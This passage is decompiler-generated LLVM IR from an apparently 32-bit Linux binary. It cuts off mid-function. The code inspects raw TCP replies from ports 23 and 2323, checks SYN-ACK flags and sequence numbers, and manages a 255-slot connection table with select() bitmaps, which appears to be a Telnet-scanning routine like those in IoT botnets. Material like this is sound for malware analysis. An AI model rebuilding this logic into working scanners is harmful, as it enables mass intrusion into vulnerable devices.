  store i32 %v3_804e181, i32* %esi.global-to-local, align 4
  %v1_804e185 = trunc i32 %v3_804e181 to i16
  %v7_804e185 = icmp ne i16 %v1_804e185, 5888
  %v10_804e18c = icmp eq i16 %v1_804e185, 4873
  %v1_804e191 = icmp eq i1 %v10_804e18c, false
  %or.cond163 = and i1 %v7_804e185, %v1_804e191
  br i1 %or.cond163, label %dec_label_pc_804e126, label %dec_label_pc_804e193

dec_label_pc_804e193:                             ; preds = %dec_label_pc_804e181
  %v1_804e193 = add i32 %v0_804e151, 46
  %v2_804e193 = inttoptr i32 %v1_804e193 to i16*
  %v3_804e193 = load i16, i16* %v2_804e193, align 2
  %v4_804e193 = zext i16 %v3_804e193 to i32
  %v6_804e193 = and i32 %v3_804e16e, -65536
  %v7_804e193 = or i32 %v4_804e193, %v6_804e193
  store i32 %v7_804e193, i32* %eax.global-to-local, align 4
  %v3_804e198 = add i32 %v0_804e151, 96
  %v4_804e198 = inttoptr i32 %v3_804e198 to i16*
  %v5_804e198 = load i16, i16* %v4_804e198, align 2
  %v16_804e198 = icmp eq i16 %v3_804e193, %v5_804e198
  %v1_804e19d = icmp eq i1 %v16_804e198, false
  br i1 %v1_804e19d, label %dec_label_pc_804e126, label %dec_label_pc_804e19f

dec_label_pc_804e19f:                             ; preds = %dec_label_pc_804e193
  %v1_804e19f = add i32 %v0_804e151, 107
  %v2_804e19f = inttoptr i32 %v1_804e19f to i8*
  %v3_804e19f = load i8, i8* %v2_804e19f, align 1
  %v4_804e19f = zext i8 %v3_804e19f to i32
  %v6_804e19f = and i32 %v7_804e193, -256
  %v7_804e19f = or i32 %v4_804e19f, %v6_804e19f
  store i32 %v7_804e19f, i32* %eax.global-to-local, align 4
  %v2_804e1a3 = and i8 %v3_804e19f, 2
  %v3_804e1a3 = icmp eq i8 %v2_804e1a3, 0
  %v2_804e1ab = and i32 %v4_804e19f, 16
  %v3_804e1ab = icmp eq i32 %v2_804e1ab, 0
  %or.cond164 = or i1 %v3_804e1a3, %v3_804e1ab
  br i1 %or.cond164, label %dec_label_pc_804e126, label %dec_label_pc_804e1b3

dec_label_pc_804e1b3:                             ; preds = %dec_label_pc_804e19f
  %v2_804e1b3 = and i32 %v4_804e19f, 4
  %v3_804e1b3 = icmp eq i32 %v2_804e1b3, 0
  %v1_804e1b5 = icmp eq i1 %v3_804e1b3, false
  br i1 %v1_804e1b5, label %dec_label_pc_804e126, label %dec_label_pc_804e1bb

dec_label_pc_804e1bb:                             ; preds = %dec_label_pc_804e1b3
  %tmp309 = urem i8 %v3_804e19f, 2
  %v3_804e1bb = icmp eq i8 %tmp309, 0
  %v1_804e1bd = icmp eq i1 %v3_804e1bb, false
  br i1 %v1_804e1bd, label %dec_label_pc_804e126, label %dec_label_pc_804e1c3

dec_label_pc_804e1c3:                             ; preds = %dec_label_pc_804e1bb
  %v1_804e1c3 = add i32 %v0_804e151, 102
  %v2_804e1c3 = inttoptr i32 %v1_804e1c3 to i32*
  %v3_804e1c3 = load i32, i32* %v2_804e1c3, align 4
  %v1_804e1c7 = trunc i32 %v3_804e1c3 to i16
  %v2_804e1c7 = call i16 @llvm.bswap.i16(i16 %v1_804e1c7)
  %v3_804e1c7 = zext i16 %v2_804e1c7 to i32
  %v1_804e1cb = udiv i32 %v3_804e1c3, 65536
  %v2_804e1cb = mul nuw i32 %v3_804e1c7, 65536
  %v1_804e1ce = trunc i32 %v1_804e1cb to i16
  %v2_804e1ce = call i16 @llvm.bswap.i16(i16 %v1_804e1ce)
  %v3_804e1ce = zext i16 %v2_804e1ce to i32
  %v6_804e1ce = or i32 %v3_804e1ce, %v2_804e1cb
  store i32 %v6_804e1ce, i32* %eax.global-to-local, align 4
  %v1_804e1d2 = add i32 %v6_804e1ce, -1
  %v1_804e1d5 = trunc i32 %v1_804e1d2 to i16
  %v2_804e1d5 = call i16 @llvm.bswap.i16(i16 %v1_804e1d5)
  %v3_804e1d5 = zext i16 %v2_804e1d5 to i32
  %v1_804e1d9 = udiv i32 %v1_804e1d2, 65536
  %v2_804e1d9 = mul nuw i32 %v3_804e1d5, 65536
  %v1_804e1dc = trunc i32 %v1_804e1d9 to i16
  %v2_804e1dc = call i16 @llvm.bswap.i16(i16 %v1_804e1dc)
  %v3_804e1dc = zext i16 %v2_804e1dc to i32
  %v6_804e1dc = or i32 %v3_804e1dc, %v2_804e1d9
  store i32 %v6_804e1dc, i32* %edx.global-to-local, align 4
  %v1_804e1e0 = add i32 %v0_804e151, 86
  %v2_804e1e0 = inttoptr i32 %v1_804e1e0 to i32*
  %v3_804e1e0 = load i32, i32* %v2_804e1e0, align 4
  %v15_804e1e0 = icmp eq i32 %v3_804e1e0, %v6_804e1dc
  %v1_804e1e4 = icmp eq i1 %v15_804e1e0, false
  br i1 %v1_804e1e4, label %dec_label_pc_804e126, label %dec_label_pc_804e1ea

dec_label_pc_804e1ea:                             ; preds = %dec_label_pc_804e1c3
  %v0_804e1ea = load i32, i32* @ebx, align 4
  %v1_804e1ea = add i32 %v0_804e1ea, -255
  %v6_804e1ea = sub i32 254, %v0_804e1ea
  %v7_804e1ea = and i32 %v6_804e1ea, %v0_804e1ea
  %v8_804e1ea = icmp slt i32 %v7_804e1ea, 0
  %v9_804e1ea = icmp eq i32 %v1_804e1ea, 0
  %v10_804e1ea = icmp slt i32 %v1_804e1ea, 0
  %v3_804e1f0 = icmp eq i1 %v10_804e1ea, %v8_804e1ea
  %v4_804e1f0 = icmp eq i1 %v9_804e1ea, false
  %v5_804e1f0 = and i1 %v4_804e1f0, %v3_804e1f0
  br i1 %v5_804e1f0, label %dec_label_pc_804e236, label %dec_label_pc_804e1f2

dec_label_pc_804e1f2:                             ; preds = %dec_label_pc_804e1ea
  %v0_804e1f5 = load i32, i32* @global_var_8053178.21, align 8
  store i32 %v0_804e1f5, i32* %ecx.global-to-local, align 4
  %v2_804e1fb = mul i32 %v0_804e1ea, 288
  %v2_804e1fe = add i32 %v0_804e1f5, %v2_804e1fb
  store i32 %v2_804e1fe, i32* @eax, align 4
  %v1_804e200 = add i32 %v2_804e1fe, 12
  %v2_804e200 = inttoptr i32 %v1_804e200 to i32*
  %v3_804e200 = load i32, i32* %v2_804e200, align 4
  %v1_804e203 = add i32 %v2_804e1fe, 288
  store i32 %v1_804e203, i32* %ecx.global-to-local, align 4
  %v1_804e209 = icmp eq i32 %v3_804e200, 0
  br i1 %v1_804e209, label %dec_label_pc_804e225, label %dec_label_pc_804e20d

dec_label_pc_804e20d:                             ; preds = %dec_label_pc_804e1f2, %dec_label_pc_804e216
  %v0_804e216 = phi i32 [ %v1_804e218, %dec_label_pc_804e216 ], [ %v1_804e203, %dec_label_pc_804e1f2 ]
  %v0_804e20d = phi i32 [ %v1_804e20d, %dec_label_pc_804e216 ], [ %v0_804e1ea, %dec_label_pc_804e1f2 ]
  %v1_804e20d = add i32 %v0_804e20d, 1
  store i32 %v1_804e20d, i32* @ebx, align 4
  %v6_804e20e = icmp eq i32 %v0_804e20d, 255
  br i1 %v6_804e20e, label %dec_label_pc_804e236, label %dec_label_pc_804e216

dec_label_pc_804e216:                             ; preds = %dec_label_pc_804e20d
  store i32 %v0_804e216, i32* @eax, align 4
  %v1_804e218 = add i32 %v0_804e216, 288
  store i32 %v1_804e218, i32* %ecx.global-to-local, align 4
  %v1_804e21e = add i32 %v0_804e216, 12
  %v2_804e21e = inttoptr i32 %v1_804e21e to i32*
  %v3_804e21e = load i32, i32* %v2_804e21e, align 4
  store i32 %v3_804e21e, i32* @edi, align 4
  %v1_804e221 = icmp eq i32 %v3_804e21e, 0
  %v1_804e223 = icmp eq i1 %v1_804e221, false
  br i1 %v1_804e223, label %dec_label_pc_804e20d, label %dec_label_pc_804e225

dec_label_pc_804e225:                             ; preds = %dec_label_pc_804e216, %dec_label_pc_804e1f2
  %v1_804e225 = phi i32 [ %v2_804e1fe, %dec_label_pc_804e1f2 ], [ %v0_804e216, %dec_label_pc_804e216 ]
  %v2_804e225 = add i32 %v1_804e225, 16
  %v3_804e225 = inttoptr i32 %v2_804e225 to i32*
  store i32 %v6_804e1dc, i32* %v3_804e225, align 4
  %v0_804e228 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e228 = trunc i32 %v0_804e228 to i16
  %v2_804e228 = load i32, i32* @eax, align 4
  %v3_804e228 = add i32 %v2_804e228, 20
  %v4_804e228 = inttoptr i32 %v3_804e228 to i16*
  store i16 %v1_804e228, i16* %v4_804e228, align 2
  %v0_804e22c = call i32 @function_804d8e0()
  store i32 %v0_804e22c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e126

dec_label_pc_804e236:                             ; preds = %dec_label_pc_804e1ea, %dec_label_pc_804e15c, %dec_label_pc_804e126, %dec_label_pc_804e20d
  store i32 32, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804e23f = add i32 %v0_804e151, 36
  %v2_804e23f = inttoptr i32 %v1_804e23f to i32*
  %v3_804e23f = load i32, i32* %v2_804e23f, align 4
  %v4_804e23f = inttoptr i32 %v3_804e23f to i8*
  %v5_804e244 = call i8* @_memset(i8* %v4_804e23f, i32 0, i32 32)
  %v0_804e246 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804e246, i32* %ecx.global-to-local, align 4
  %v0_804e248 = load i32, i32* @esp, align 4
  %v1_804e248 = inttoptr i32 %v0_804e248 to i32*
  %v2_804e248 = load i32, i32* %v1_804e248, align 4
  %v3_804e248 = inttoptr i32 %v2_804e248 to i8*
  %v2_804e24c = load i32, i32* %eax.global-to-local, align 4
  %v5_804e24c = call i8* @_memset(i8* %v3_804e248, i32 %v2_804e24c, i32 %v0_804e246)
  %v6_804e24c = ptrtoint i8* %v5_804e24c to i32
  store i32 %v6_804e24c, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store i32 0, i32* @esi, align 4
  %v0_804e252 = load i32, i32* @esp, align 4
  %v1_804e252 = add i32 %v0_804e252, 1852
  %v2_804e252 = inttoptr i32 %v1_804e252 to i32*
  store i32 0, i32* %v2_804e252, align 4
  %v0_804e29d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e29d

dec_label_pc_804e260:                             ; preds = %dec_label_pc_804e2b7
  store i32 %v1_804e2b2, i32* %edx.global-to-local, align 4
  %v1_804e30f = add i32 %v2_804e2ad, 4
  %v2_804e30f = inttoptr i32 %v1_804e30f to i32*
  %v3_804e30f = load i32, i32* %v2_804e30f, align 4
  %v1_804e314 = urem i32 %v3_804e30f, 32
  store i32 %v1_804e314, i32* %eax.global-to-local, align 4
  %v2_804e317 = udiv i32 %v3_804e30f, 32
  store i32 %v2_804e317, i32* %edx.global-to-local, align 4
  %v0_804e31a = load i32, i32* @esp, align 4
  %v2_804e31a = mul nuw nsw i32 %v2_804e317, 4
  br i1 %v9_804e2b2, label %dec_label_pc_804e30f, label %dec_label_pc_804e267

dec_label_pc_804e267:                             ; preds = %dec_label_pc_804e260
  %v3_804e272 = add nuw nsw i32 %v2_804e31a, 1684
  %v4_804e272 = add i32 %v3_804e272, %v0_804e31a
  %v5_804e272 = inttoptr i32 %v4_804e272 to i32*
  %v6_804e272 = load i32, i32* %v5_804e272, align 4
  %v9_804e272 = shl i32 1, %v1_804e314
  %v12_804e272 = or i32 %v6_804e272, %v9_804e272
  store i32 %v12_804e272, i32* %v5_804e272, align 4
  %v0_804e27a = load i32, i32* @ebx, align 4
  %v1_804e27a = add i32 %v0_804e27a, 4
  %v2_804e27a = inttoptr i32 %v1_804e27a to i32*
  %v3_804e27a = load i32, i32* %v2_804e27a, align 4
  store i32 %v3_804e27a, i32* %eax.global-to-local, align 4
  %v0_804e27d = load i32, i32* @edi, align 4
  %v2_804e27d = sub i32 %v0_804e27d, %v3_804e27a
  %v8_804e27d = xor i32 %v0_804e27d, %v3_804e27a
  %v9_804e27d = xor i32 %v2_804e27d, %v0_804e27d
  %v10_804e27d = and i32 %v9_804e27d, %v8_804e27d
  %v11_804e27d = icmp slt i32 %v10_804e27d, 0
  %v13_804e27d = icmp slt i32 %v2_804e27d, 0
  %v2_804e27f = icmp eq i1 %v13_804e27d, %v11_804e27d
  br i1 %v2_804e27f, label %dec_label_pc_804e283, label %dec_label_pc_804e281

dec_label_pc_804e281:                             ; preds = %dec_label_pc_804e267
  store i32 %v3_804e27a, i32* @edi, align 4
  br label %dec_label_pc_804e283

dec_label_pc_804e283:                             ; preds = %dec_label_pc_804e30f, %dec_label_pc_804e303, %dec_label_pc_804e267, %dec_label_pc_804ef5c, %dec_label_pc_804e32d, %dec_label_pc_804e2fa, %dec_label_pc_804e281
  %v0_804e283 = load i32, i32* @esp, align 4
  %v1_804e283 = add i32 %v0_804e283, 1852
  %v2_804e283 = inttoptr i32 %v1_804e283 to i32*
  %v3_804e283 = load i32, i32* %v2_804e283, align 4
  %v1_804e28a = add i32 %v3_804e283, 1
  store i32 %v1_804e28a, i32* %eax.global-to-local, align 4
  store i32 %v1_804e28a, i32* %v2_804e283, align 4
  %v0_804e292 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e292 = add i32 %v0_804e292, -255
  %v6_804e292 = sub i32 254, %v0_804e292
  %v7_804e292 = and i32 %v6_804e292, %v0_804e292
  %v8_804e292 = icmp slt i32 %v7_804e292, 0
  %v9_804e292 = icmp eq i32 %v1_804e292, 0
  %v10_804e292 = icmp slt i32 %v1_804e292, 0
  %v3_804e297 = icmp eq i1 %v10_804e292, %v8_804e292
  %v4_804e297 = icmp eq i1 %v9_804e292, false
  %v5_804e297 = and i1 %v4_804e297, %v3_804e297
  br i1 %v5_804e297, label %dec_label_pc_804e34f, label %dec_label_pc_804e29d

dec_label_pc_804e29d:                             ; preds = %dec_label_pc_804e283, %dec_label_pc_804e236
  %v0_804e29d = phi i32 [ %v0_804e292, %dec_label_pc_804e283 ], [ %v0_804e29d.pre, %dec_label_pc_804e236 ]
  %v0_804e2a0 = load i32, i32* @global_var_8053178.21, align 8
  store i32 %v0_804e2a0, i32* %eax.global-to-local, align 4
  %v2_804e2a5 = mul i32 %v0_804e29d, 288
  store i32 30, i32* %ecx.global-to-local, align 4
  %v2_804e2ad = add i32 %v0_804e2a0, %v2_804e2a5
  store i32 %v2_804e2ad, i32* @ebx, align 4
  %v1_804e2af = add i32 %v2_804e2ad, 12
  %v2_804e2af = inttoptr i32 %v1_804e2af to i32*
  %v3_804e2af = load i32, i32* %v2_804e2af, align 4
  store i32 %v3_804e2af, i32* %edx.global-to-local, align 4
  %v1_804e2b2 = add i32 %v3_804e2af, -1
  %v5_804e2b2 = icmp eq i32 %v3_804e2af, 0
  %v9_804e2b2 = icmp eq i32 %v1_804e2b2, 0
  %v2_804e2b5 = or i1 %v5_804e2b2, %v9_804e2b2
  br i1 %v2_804e2b5, label %dec_label_pc_804e303, label %dec_label_pc_804e2b7

dec_label_pc_804e2b7:                             ; preds = %dec_label_pc_804e29d, %dec_label_pc_804e30b
  %v1_804e2c1 = phi i32 [ 30, %dec_label_pc_804e29d ], [ 5, %dec_label_pc_804e30b ]
  %v0_804e2b7 = load i32, i32* @global_var_8053130.9, align 16
  store i32 %v0_804e2b7, i32* %eax.global-to-local, align 4
  %v1_804e2bc = add i32 %v2_804e2ad, 8
  %v2_804e2bc = inttoptr i32 %v1_804e2bc to i32*
  %v3_804e2bc = load i32, i32* %v2_804e2bc, align 4
  %v2_804e2bf = sub i32 %v0_804e2b7, %v3_804e2bc
  store i32 %v2_804e2bf, i32* %eax.global-to-local, align 4
  %tmp303 = icmp ugt i32 %v2_804e2bf, %v1_804e2c1
  br i1 %tmp303, label %dec_label_pc_804e2c5, label %dec_label_pc_804e260

dec_label_pc_804e2c5:                             ; preds = %dec_label_pc_804e2b7
  %v0_804e2c5 = load i32, i32* @esp, align 4
  %v1_804e2c8 = add i32 %v2_804e2ad, 4
  %v2_804e2c8 = inttoptr i32 %v1_804e2c8 to i32*
  %v3_804e2c8 = load i32, i32* %v2_804e2c8, align 4
  store i32 %v3_804e2c8, i32* %eax.global-to-local, align 4
  %v2_804e2cb = add i32 %v0_804e2c5, -16
  %v3_804e2cb = inttoptr i32 %v2_804e2cb to i32*
  store i32 %v3_804e2c8, i32* %v3_804e2cb, align 4
  %v1_804e2cc = call i32 @function_804fab3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e2cc, i32* %eax.global-to-local, align 4
  %v0_804e2d4 = load i32, i32* @ebx, align 4
  %v1_804e2d4 = add i32 %v0_804e2d4, 4
  %v2_804e2d4 = inttoptr i32 %v1_804e2d4 to i32*
  store i32 -1, i32* %v2_804e2d4, align 4
  %v0_804e2db = load i32, i32* @ebx, align 4
  %v1_804e2db = add i32 %v0_804e2db, 12
  %v2_804e2db = inttoptr i32 %v1_804e2db to i32*
  %v3_804e2db = load i32, i32* %v2_804e2db, align 4
  %tmp304 = icmp ult i32 %v3_804e2db, 3
  br i1 %tmp304, label %dec_label_pc_804ef5c, label %dec_label_pc_804e2e5

dec_label_pc_804e2e5:                             ; preds = %dec_label_pc_804e2c5
  %v1_804e2e5 = add i32 %v0_804e2db, 284
  %v2_804e2e5 = inttoptr i32 %v1_804e2e5 to i8*
  %v3_804e2e5 = load i8, i8* %v2_804e2e5, align 1
  %v4_804e2e5 = zext i8 %v3_804e2e5 to i32
  %v6_804e2e5 = and i32 %v1_804e2cc, -256
  %v7_804e2e5 = or i32 %v4_804e2e5, %v6_804e2e5
  %v1_804e2eb = add i32 %v7_804e2e5, 1
  %v10_804e2eb = trunc i32 %v1_804e2eb to i8
  store i32 %v1_804e2eb, i32* %eax.global-to-local, align 4
  store i8 %v10_804e2eb, i8* %v2_804e2e5, align 1
  %v0_804e2f2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e2f2 = trunc i32 %v0_804e2f2 to i8
  %v10_804e2f2 = icmp eq i8 %v1_804e2f2, 10
  br i1 %v10_804e2f2, label %dec_label_pc_804ef5c, label %dec_label_pc_804e2fa

dec_label_pc_804e2fa:                             ; preds = %dec_label_pc_804e2e5
  %v0_804e2fa = load i32, i32* @ebx, align 4
  store i32 %v0_804e2fa, i32* @eax, align 4
  %v0_804e2fc = call i32 @function_804d8e0()
  store i32 %v0_804e2fc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e283

dec_label_pc_804e303:                             ; preds = %dec_label_pc_804e29d
  br i1 %v5_804e2b2, label %dec_label_pc_804e283, label %dec_label_pc_804e30b

dec_label_pc_804e30b:                             ; preds = %dec_label_pc_804e303
  store i32 5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e2b7

dec_label_pc_804e30f:                             ; preds = %dec_label_pc_804e260
  %v3_804e31a = add nuw nsw i32 %v2_804e31a, 1556
  %v4_804e31a = add i32 %v3_804e31a, %v0_804e31a
  %v5_804e31a = inttoptr i32 %v4_804e31a to i32*
  %v6_804e31a = load i32, i32* %v5_804e31a, align 4
  %v9_804e31a = shl i32 1, %v1_804e314
  %v12_804e31a = or i32 %v6_804e31a, %v9_804e31a
  store i32 %v12_804e31a, i32* %v5_804e31a, align 4
  %v0_804e322 = load i32, i32* @ebx, align 4
  %v1_804e322 = add i32 %v0_804e322, 4
  %v2_804e322 = inttoptr i32 %v1_804e322 to i32*
  %v3_804e322 = load i32, i32* %v2_804e322, align 4
  store i32 %v3_804e322, i32* %eax.global-to-local, align 4
  %v0_804e325 = load i32, i32* @esi, align 4
  %v2_804e325 = sub i32 %v0_804e325, %v3_804e322
  %v8_804e325 = xor i32 %v0_804e325, %v3_804e322
  %v9_804e325 = xor i32 %v2_804e325, %v0_804e325
  %v10_804e325 = and i32 %v9_804e325, %v8_804e325
  %v11_804e325 = icmp slt i32 %v10_804e325, 0
  %v13_804e325 = icmp slt i32 %v2_804e325, 0
  %v2_804e327 = icmp eq i1 %v13_804e325, %v11_804e325
  br i1 %v2_804e327, label %dec_label_pc_804e283, label %dec_label_pc_804e32d

dec_label_pc_804e32d:                             ; preds = %dec_label_pc_804e30f
  store i32 %v3_804e322, i32* @esi, align 4
  br label %dec_label_pc_804e283

dec_label_pc_804e34f:                             ; preds = %dec_label_pc_804e283
  %v0_804e34f = load i32, i32* @esp, align 4
  %v1_804e34f = add i32 %v0_804e34f, 1844
  %v2_804e34f = inttoptr i32 %v1_804e34f to i32*
  store i32 0, i32* %v2_804e34f, align 4
  %v0_804e35a = load i32, i32* @esp, align 4
  %v1_804e35a = add i32 %v0_804e35a, 1840
  %v2_804e35a = inttoptr i32 %v1_804e35a to i32*
  store i32 1, i32* %v2_804e35a, align 4
  %v0_804e365 = load i32, i32* @esp, align 4
  %v0_804e368 = load i32, i32* @edi, align 4
  %v1_804e368 = load i32, i32* @esi, align 4
  %v2_804e368 = sub i32 %v0_804e368, %v1_804e368
  %v8_804e368 = xor i32 %v1_804e368, %v0_804e368
  %v9_804e368 = xor i32 %v2_804e368, %v0_804e368
  %v10_804e368 = and i32 %v9_804e368, %v8_804e368
  %v11_804e368 = icmp slt i32 %v10_804e368, 0
  %v13_804e368 = icmp slt i32 %v2_804e368, 0
  %v1_804e36a = add i32 %v0_804e365, 1840
  %v2_804e371 = add i32 %v0_804e365, -16
  %v3_804e371 = inttoptr i32 %v2_804e371 to i32*
  store i32 %v1_804e36a, i32* %v3_804e371, align 4
  %v1_804e372 = add i32 %v0_804e365, -20
  %v2_804e372 = inttoptr i32 %v1_804e372 to i32*
  store i32 0, i32* %v2_804e372, align 4
  %v1_804e374 = add i32 %v0_804e365, 1556
  store i32 %v1_804e374, i32* %edx.global-to-local, align 4
  %v0_804e37b = load i32, i32* @edi, align 4
  store i32 %v0_804e37b, i32* %eax.global-to-local, align 4
  %v2_804e37d = add i32 %v0_804e365, -24
  %v3_804e37d = inttoptr i32 %v2_804e37d to i32*
  store i32 %v1_804e374, i32* %v3_804e37d, align 4
  %v1_804e37e = add i32 %v0_804e365, 1684
  store i32 %v1_804e37e, i32* %ecx.global-to-local, align 4
  %v2_804e385 = add i32 %v0_804e365, -28
  %v3_804e385 = inttoptr i32 %v2_804e385 to i32*
  store i32 %v1_804e37e, i32* %v3_804e385, align 4
  %v2_804e386 = icmp eq i1 %v13_804e368, %v11_804e368
  br i1 %v2_804e386, label %dec_label_pc_804e34f.dec_label_pc_804e38a_crit_edge, label %dec_label_pc_804e388

dec_label_pc_804e34f.dec_label_pc_804e38a_crit_edge: ; preds = %dec_label_pc_804e34f
  %v0_804e38a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e38a

dec_label_pc_804e388:                             ; preds = %dec_label_pc_804e34f
  %v0_804e388 = load i32, i32* @esi, align 4
  store i32 %v0_804e388, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e38a

dec_label_pc_804e38a:                             ; preds = %dec_label_pc_804e34f.dec_label_pc_804e38a_crit_edge, %dec_label_pc_804e388
  %v0_804e38a = phi i32 [ %v0_804e38a.pre, %dec_label_pc_804e34f.dec_label_pc_804e38a_crit_edge ], [ %v0_804e388, %dec_label_pc_804e388 ]
  %v1_804e38a = add i32 %v0_804e38a, 1
  store i32 %v1_804e38a, i32* %eax.global-to-local, align 4
  %v2_804e38b = add i32 %v0_804e365, -32
  %v3_804e38b = inttoptr i32 %v2_804e38b to i32*
  store i32 %v1_804e38a, i32* %v3_804e38b, align 4
  %v0_804e38c = call i32 @function_804fcba()
  store i32 %v0_804e38c, i32* %eax.global-to-local, align 4
  %v0_804e391 = load i32, i32* @esp, align 4
  %v1_804e394 = add i32 %v0_804e391, 16
  %v2_804e394 = inttoptr i32 %v1_804e394 to i32*
  store i32 0, i32* %v2_804e394, align 4
  %v0_804e396 = call i32 @function_804fd74()
  %v0_804e39b = load i32, i32* @esp, align 4
  %v1_804e39b = add i32 %v0_804e39b, 1868
  %v2_804e39b = inttoptr i32 %v1_804e39b to i32*
  store i32 0, i32* %v2_804e39b, align 4
  store i32 %v0_804e396, i32* @global_var_8053130.9, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e3cc

dec_label_pc_804e3b2:                             ; preds = %dec_label_pc_804e415.backedge, %dec_label_pc_804e415.preheader, %dec_label_pc_804e3cc, %dec_label_pc_804e8c2, %dec_label_pc_804e3fe, %dec_label_pc_804ef7e, %dec_label_pc_804ee79, %dec_label_pc_804e8fa
  %v0_804e3b2 = load i32, i32* @esp, align 4
  %v1_804e3b2 = add i32 %v0_804e3b2, 1852
  %v2_804e3b2 = inttoptr i32 %v1_804e3b2 to i32*
  %v3_804e3b2 = load i32, i32* %v2_804e3b2, align 4
  %v1_804e3b9 = add i32 %v3_804e3b2, 1
  store i32 %v1_804e3b9, i32* %eax.global-to-local, align 4
  store i32 %v1_804e3b9, i32* %v2_804e3b2, align 4
  %v0_804e3c1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e3c1 = add i32 %v0_804e3c1, -255
  %v6_804e3c1 = sub i32 254, %v0_804e3c1
  %v7_804e3c1 = and i32 %v6_804e3c1, %v0_804e3c1
  %v8_804e3c1 = icmp slt i32 %v7_804e3c1, 0
  %v9_804e3c1 = icmp eq i32 %v1_804e3c1, 0
  %v10_804e3c1 = icmp slt i32 %v1_804e3c1, 0
  %v3_804e3c6 = icmp eq i1 %v10_804e3c1, %v8_804e3c1
  %v4_804e3c6 = icmp eq i1 %v9_804e3c1, false
  %v5_804e3c6 = and i1 %v4_804e3c6, %v3_804e3c6
  br i1 %v5_804e3c6, label %.loopexit, label %dec_label_pc_804e3cc

dec_label_pc_804e3cc:                             ; preds = %dec_label_pc_804e3b2, %dec_label_pc_804e38a
  %v0_804e3cc = phi i32 [ %v0_804e3c1, %dec_label_pc_804e3b2 ], [ 0, %dec_label_pc_804e38a ]
  %v0_804e3cf = load i32, i32* @global_var_8053178.21, align 8
  store i32 %v0_804e3cf, i32* %eax.global-to-local, align 4
  %v2_804e3d4 = mul i32 %v0_804e3cc, 288
  %v2_804e3d7 = add i32 %v0_804e3cf, %v2_804e3d4
  store i32 %v2_804e3d7, i32* @edi, align 4
  %v1_804e3d9 = add i32 %v2_804e3d7, 4
  %v2_804e3d9 = inttoptr i32 %v1_804e3d9 to i32*
  %v3_804e3d9 = load i32, i32* %v2_804e3d9, align 4
  store i32 %v3_804e3d9, i32* %ecx.global-to-local, align 4
  %v10_804e3dc = icmp eq i32 %v3_804e3d9, -1
  br i1 %v10_804e3dc, label %dec_label_pc_804e3b2, label %dec_label_pc_804e3e1

dec_label_pc_804e3e1:                             ; preds = %dec_label_pc_804e3cc
  %v2_804e3e5 = udiv i32 %v3_804e3d9, 32
  store i32 %v2_804e3e5, i32* %edx.global-to-local, align 4
  %v1_804e3e8 = urem i32 %v3_804e3d9, 32
  store i32 %v1_804e3e8, i32* %eax.global-to-local, align 4
  %v0_804e3eb = load i32, i32* @esp, align 4
  %v2_804e3eb = mul nuw nsw i32 %v2_804e3e5, 4
  %v3_804e3eb = add nuw nsw i32 %v2_804e3eb, 1556
  %v4_804e3eb = add i32 %v3_804e3eb, %v0_804e3eb
  %v5_804e3eb = inttoptr i32 %v4_804e3eb to i32*
  %v6_804e3eb = load i32, i32* %v5_804e3eb, align 4
  %v9_804e3eb = shl i32 1, %v1_804e3e8
  %v10_804e3eb = and i32 %v6_804e3eb, %v9_804e3eb
  %v11_804e3eb = icmp ne i32 %v10_804e3eb, 0
  %v1_804e3f3 = zext i1 %v11_804e3eb to i32
  store i32 %v1_804e3f3, i32* %eax.global-to-local, align 4
  %v4_804e3f6 = icmp eq i1 %v11_804e3eb, false
  %v1_804e3f8 = icmp eq i1 %v4_804e3f6, false
  br i1 %v1_804e3f8, label %dec_label_pc_804edd6, label %dec_label_pc_804e3fe

dec_label_pc_804e3fe:                             ; preds = %dec_label_pc_804e3e1, %dec_label_pc_804ee68
  %v0_804e406 = phi i32 [ %v0_804e3eb, %dec_label_pc_804e3e1 ], [ %v0_804e406.pre, %dec_label_pc_804ee68 ]
  %v0_804e3fe = phi i32 [ %v3_804e3d9, %dec_label_pc_804e3e1 ], [ %v0_804e3fe.pre, %dec_label_pc_804ee68 ]
  %v2_804e400 = udiv i32 %v0_804e3fe, 32
  store i32 %v2_804e400, i32* %ecx.global-to-local, align 4
  %v1_804e403 = urem i32 %v0_804e3fe, 32
  store i32 %v1_804e403, i32* %eax.global-to-local, align 4
  %v2_804e406 = mul nuw nsw i32 %v2_804e400, 4
  %v3_804e406 = add i32 %v0_804e406, 1684
  %v4_804e406 = add i32 %v3_804e406, %v2_804e406
  %v5_804e406 = inttoptr i32 %v4_804e406 to i32*
  %v6_804e406 = load i32, i32* %v5_804e406, align 4
  %v9_804e406 = shl i32 1, %v1_804e403
  %v10_804e406 = and i32 %v6_804e406, %v9_804e406
  %v11_804e406 = icmp ne i32 %v10_804e406, 0
  %v1_804e40e = zext i1 %v11_804e406 to i32
  store i32 %v1_804e40e, i32* %eax.global-to-local, align 4
  %v4_804e411 = icmp eq i1 %v11_804e406, false
  br i1 %v4_804e411, label %dec_label_pc_804e3b2, label %dec_label_pc_804e415.preheader

dec_label_pc_804e415.preheader:                   ; preds = %dec_label_pc_804e3fe
  %v0_804e41526 = load i32, i32* @edi, align 4
  %v1_804e41527 = add i32 %v0_804e41526, 12
  %v2_804e41528 = inttoptr i32 %v1_804e41527 to i32*
  %v3_804e41529 = load i32, i32* %v2_804e41528, align 4
  store i32 %v3_804e41529, i32* %eax.global-to-local, align 4
  %v1_804e41830 = icmp eq i32 %v3_804e41529, 0
  br i1 %v1_804e41830, label %dec_label_pc_804e3b2, label %dec_label_pc_804e41c

dec_label_pc_804e41c:                             ; preds = %dec_label_pc_804e415.preheader, %dec_label_pc_804e415.backedge.dec_label_pc_804e41c_crit_edge
